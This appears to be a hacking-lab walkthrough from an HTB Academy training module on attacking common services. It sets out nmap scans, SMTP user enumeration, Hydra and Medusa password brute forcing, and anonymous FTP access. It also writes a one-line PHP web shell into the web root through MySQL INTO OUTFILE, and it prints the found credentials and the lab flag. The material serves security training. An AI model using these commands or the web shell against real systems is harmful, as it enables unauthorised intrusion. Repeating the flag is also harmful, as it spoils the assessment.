## Easy

## Medium

**Domain**
```
inlanefreight.htb
```




**IP**
```
10.129.54.68
```

**NMAP**
```
nmap -p- -Pn -sC 10.129.54.68
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-08 21:57 EST
Nmap scan report for inlanefreight.htb (10.129.54.68)
Host is up (0.024s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Not valid before: 2022-04-21T19:27:17
|_Not valid after:  2032-04-18T19:27:17
25/tcp   open  smtp
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http
| http-title: Welcome to XAMPP
|_Requested resource was http://inlanefreight.htb/dashboard/
443/tcp  open  https
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Not valid before: 2022-04-21T19:27:17
|_Not valid after:  2032-04-18T19:27:17
|_ssl-date: 2024-01-09T03:03:04+00:00; -1s from scanner time.
587/tcp  open  submission
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3306/tcp open  mysql
3389/tcp open  ms-wbt-server
| ssl-cert: Subject: commonName=WIN-EASY
| Not valid before: 2024-01-08T02:45:58
|_Not valid after:  2024-07-09T02:45:58
|_ssl-date: 2024-01-09T03:03:03+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WIN-EASY
|   NetBIOS_Domain_Name: WIN-EASY
|   NetBIOS_Computer_Name: WIN-EASY
|   DNS_Domain_Name: WIN-EASY
|   DNS_Computer_Name: WIN-EASY
|   Product_Version: 10.0.17763
|_  System_Time: 2024-01-09T03:03:03+00:00


```



**Credentials Found:**

Email
```
fiona@inlanefreight.htb
```

Username
```
fiona@inlanefreight.htb
```

Password
```
987654321
```


**SMTP USER ENUMERATION**
```
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.54.68                                   
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Mon Jan  8 22:40:53 2024 #########
10.129.54.68: fiona@inlanefreight.htb exists
######## Scan completed at Mon Jan  8 22:40:55 2024 #########
1 results.

79 queries in 2 seconds (39.5 queries / sec)
```


**Hydra - Password Brute Forcing**

```
hydra -l fiona@inlanefreight.htb -P passwords.list -f 10.129.54.68 smtp

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-08 22:50:30
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 250 login tries (l:1/p:250), ~16 tries per task
[DATA] attacking smtp://10.129.54.68:25/
[25][smtp] host: 10.129.54.68   login: fiona@inlanefreight.htb   password: 987654321
[STATUS] attack finished for 10.129.54.68 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-08 22:50:35

```

**MySQL Login**

Using the credentials found, login into mysql
```
mysql -h inlanefreight.htb -u fiona -p

Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 8
Server version: 10.4.24-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

**mysql database**

- use the mysql database
- create a file
```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```



**IP**
```
10.129.201.127
```

**NMAP**

```
nmap -Pn -sC -p- -sV 10.129.201.127
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-10 17:59 EST
Nmap scan report for inlanefreight.htb (10.129.201.127)
Host is up (0.034s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
53/tcp    open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
110/tcp   open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: SASL(PLAIN) TOP AUTH-RESP-CODE RESP-CODES UIDL USER PIPELINING CAPA STLS
995/tcp   open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
|_pop3-capabilities: SASL(PLAIN) PIPELINING TOP AUTH-RESP-CODE RESP-CODES UIDL USER CAPA
2121/tcp  open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (InlaneFTP) [10.129.201.127]
|     Invalid command: try being more creative
|     Invalid command: try being more creative
|   NULL: 
|_    220 ProFTPD Server (InlaneFTP) [10.129.201.127]
30021/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Internal FTP) [10.129.201.127]
|     Invalid command: try being more creative
|     Invalid command: try being more creative
|   NULL: 
|_    220 ProFTPD Server (Internal FTP) [10.129.201.127]
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2121-TCP:V=7.94SVN%I=7%D=1/10%Time=659F2172%P=aarch64-unknown-linux
SF:-gnu%r(NULL,31,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\[10\.129\
SF:.201\.127\]\r\n")%r(GenericLines,8D,"220\x20ProFTPD\x20Server\x20\(Inla
SF:neFTP\)\x20\[10\.129\.201\.127\]\r\n500\x20Invalid\x20command:\x20try\x
SF:20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20bei
SF:ng\x20more\x20creative\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port30021-TCP:V=7.94SVN%I=7%D=1/10%Time=659F2172%P=aarch64-unknown-linu
SF:x-gnu%r(NULL,34,"220\x20ProFTPD\x20Server\x20\(Internal\x20FTP\)\x20\[1
SF:0\.129\.201\.127\]\r\n")%r(GenericLines,90,"220\x20ProFTPD\x20Server\x2
SF:0\(Internal\x20FTP\)\x20\[10\.129\.201\.127\]\r\n500\x20Invalid\x20comm
SF:and:\x20try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\
SF:x20try\x20being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.62 seconds

```

**FTP Access on Uncommon Port: 30021**
```
ftp 10.129.201.127 30021       
Connected to 10.129.201.127.
220 ProFTPD Server (Internal FTP) [10.129.201.127]
Name (10.129.201.127:dan): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||52613|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
226 Transfer complete
ftp> cd simon
250 CWD command successful
ftp> ls 
229 Entering Extended Passive Mode (|||24003|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ftp      ftp           153 Apr 18  2022 mynotes.txt
226 Transfer complete
ftp> get mynotes.txt
local: mynotes.txt remote: mynotes.txt
229 Entering Extended Passive Mode (|||48347|)
150 Opening BINARY mode data connection for mynotes.txt (153 bytes)
100% |************************************************************************************************************************************|   153        1.01 MiB/s    00:00 ETA
226 Transfer complete
153 bytes received in 00:00 (1.83 KiB/s)
ftp> mget *
mget mynotes.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||28169|)
150 Opening BINARY mode data connection for mynotes.txt (153 bytes)
100% |************************************************************************************************************************************|   153        6.41 KiB/s    00:00 ETA
226 Transfer complete
153 bytes received in 00:00 (1.56 KiB/s)
ftp> ls -la
229 Entering Extended Passive Mode (|||19916|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 .
drwxrwxr-x   3 ftp      ftp          4096 Apr 18  2022 ..
-rw-rw-r--   1 ftp      ftp           153 Apr 18  2022 mynotes.txt
226 Transfer complete
ftp> exit
221 Goodbye.

```

**Brute Force FTP port 2121**

```
medusa -u simon -P mynotes.txt -h 10.129.201.127 -M ftp -n 2121
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ftp] Host: 10.129.201.127 (1 of 1, 0 complete) User: simon (1 of 1, 0 complete) Password: 234987123948729384293 (1 of 8 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.201.127 (1 of 1, 0 complete) User: simon (1 of 1, 0 complete) Password: +23358093845098 (2 of 8 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.201.127 (1 of 1, 0 complete) User: simon (1 of 1, 0 complete) Password: ThatsMyBigDog (3 of 8 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.201.127 (1 of 1, 0 complete) User: simon (1 of 1, 0 complete) Password: Rock!ng#May (4 of 8 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.201.127 (1 of 1, 0 complete) User: simon (1 of 1, 0 complete) Password: Puuuuuh7823328 (5 of 8 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.201.127 (1 of 1, 0 complete) User: simon (1 of 1, 0 complete) Password: 8Ns8j1b!23hs4921smHzwn (6 of 8 complete)
ACCOUNT FOUND: [ftp] Host: 10.129.201.127 User: simon Password: 8Ns8j1b!23hs4921smHzwn [SUCCESS]

```

Credentials Found
```
simon
```
```
8Ns8j1b!23hs4921smHzwn
```

**Flag**

With the credentials found, log into the FTP server on port 2121
```
ftp 10.129.201.127 2121

Connected to 10.129.201.127.
220 ProFTPD Server (InlaneFTP) [10.129.201.127]
Name (10.129.201.127:dan): simon
331 Password required for simon
Password: 
230 User simon logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -l
229 Entering Extended Passive Mode (|||64368|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 root     root           29 Apr 20  2022 flag.txt
drwxrwxr-x   3 simon    simon        4096 Apr 18  2022 Maildir
226 Transfer complete
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||25268|)
150 Opening BINARY mode data connection for flag.txt (29 bytes)
    29        1.26 KiB/s 
226 Transfer complete
29 bytes received in 00:00 (0.28 KiB/s)
ftp> exit
221 Goodbye.
                                                                                                                                                                        
┌──(dan㉿ZeroSigma)-[~/HackTheBox_Studies/HTB-Academy/8-Attacking Common Services]
└─$ cat flag.txt         
HTB{1qay2wsx3EDC4rfv_M3D1UM}

```